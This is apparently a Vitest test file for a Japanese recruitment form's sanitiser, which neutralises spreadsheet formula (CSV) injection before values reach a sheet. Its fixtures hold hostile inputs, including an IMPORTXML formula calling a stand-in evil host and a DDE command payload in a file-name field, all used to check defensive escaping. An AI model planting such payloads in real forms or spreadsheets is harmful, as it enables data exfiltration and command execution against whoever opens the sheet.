import { describe, expect, it } from "vitest";
import { escapeSheetValue, toSafeApplication, type Application } from "./sheet";

function base(): Application {
  return {
    inquiryType: "応募・選考について",
    recruitmentType: "キャリア採用",
    jobs: ["ルート営業"],
    name: "福井 太郎",
    furigana: "フクイ タロウ",
    email: "taro@example.com",
    phone: "090-0000-0000",
    portfolioUrl: "",
    message: "よろしくお願いします。",
    resumeUrl: "",
    resumeName: "",
    careerHistoryUrl: "",
    careerHistoryName: "",
    portfolioFileUrl: "",
    portfolioFileName: "",
  };
}

describe("escapeSheetValue", () => {
  it("通常の文字列はそのまま返す", () => {
    expect(escapeSheetValue("福井 太郎")).toBe("福井 太郎");
  });

  it("=で始まる値を数式として解釈させない", () => {
    expect(escapeSheetValue('=IMPORTXML("http://evil.example","//a")')).toBe(
      '\'=IMPORTXML("http://evil.example","//a")'
    );
  });

  it("+で始まる値を無害化する", () => {
    expect(escapeSheetValue("+1+1")).toBe("'+1+1");
  });

  it("-で始まる値を無害化する", () => {
    expect(escapeSheetValue("-1+1")).toBe("'-1+1");
  });

  it("@で始まる値を無害化する", () => {
    expect(escapeSheetValue("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
  });

  it("先頭の空白を挟んだ数式も無害化する", () => {
    expect(escapeSheetValue("  =1+1")).toBe("'  =1+1");
  });

  it("タブや改行で始まる値も無害化する（表示上は空白に見えるため）", () => {
    expect(escapeSheetValue("\t=1+1")).toBe("'\t=1+1");
  });

  it("空文字はそのまま返す", () => {
    expect(escapeSheetValue("")).toBe("");
  });

  it("電話番号として普通に使われる形式は壊さない", () => {
    expect(escapeSheetValue("090-0000-0000")).toBe("090-0000-0000");
  });
});

describe("toSafeApplication", () => {
  it("通常の入力は内容を変えない", () => {
    expect(toSafeApplication(base())).toEqual(base());
  });

  it("氏名に仕込まれた数式を無害化する", () => {
    const safe = toSafeApplication({ ...base(), name: "=1+1" });
    expect(safe.name).toBe("'=1+1");
  });

  it("本文に仕込まれた数式を無害化する", () => {
    const safe = toSafeApplication({ ...base(), message: "=HYPERLINK(\"http://evil\")" });
    expect(safe.message).toBe("'=HYPERLINK(\"http://evil\")");
  });

  it("応募職種の各要素を無害化する", () => {
    const safe = toSafeApplication({ ...base(), jobs: ["=1+1", "ルート営業"] });
    expect(safe.jobs).toEqual(["'=1+1", "ルート営業"]);
  });

  it("ファイル名を無害化する", () => {
    const safe = toSafeApplication({ ...base(), resumeName: "=cmd|'/c calc'!A1" });
    expect(safe.resumeName).toBe("'=cmd|'/c calc'!A1");
  });
});
